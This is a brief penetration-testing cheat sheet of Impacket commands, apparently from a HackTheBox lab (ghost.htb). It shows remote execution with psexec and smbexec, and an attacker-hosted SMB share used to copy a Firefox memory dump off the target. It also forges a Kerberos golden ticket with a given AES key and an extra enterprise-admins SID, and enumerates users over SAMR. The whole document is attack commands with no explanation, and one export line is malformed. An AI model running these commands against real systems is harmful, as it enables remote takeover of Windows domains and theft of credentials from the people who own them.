
## Impacket - PSExec
```bash
psexec.py 'user:pass@ipaddr'
```
## Impacket - SMBServer
```bash
smbserver.py -smb2support -username guest -password guest share ./

# Windows Connection
net use x: \\10.10.14.165\share /user:guest guest

# Copy Files
cmd /c "copy firefox.dmp X:\"
```
## Impacket - SMBExec
```bash
impacket-smbexec -k -no-pass -dc-ip 10.10.11.24 CORP.GHOST.HTB/administrator@dc01.ghost.htb
```
## Impacket - TicketConvertor
```bash
ticketConverter.py /PATH/ticket.kirbi ticket.ccache

export=KRB5CCNAME=/PATH/ticket.ccache
```
## Impacket - Ticketer
```bash
impacket-ticketer -aesKey b0eb79f35055af9d61bcbbe8ccae81d98cf63215045f7216ffd1f8e009a75e8d -domain-sid S-1-5-21-2034262909-2733679486-179904498 -extra-sid S-1-5-21-4084500788-938703357-3654145966-519 -domain corp.ghost.htb administrator
```
## Impacket - Samrdump.py
```bash
samrdump.py 10.129.14.128
```


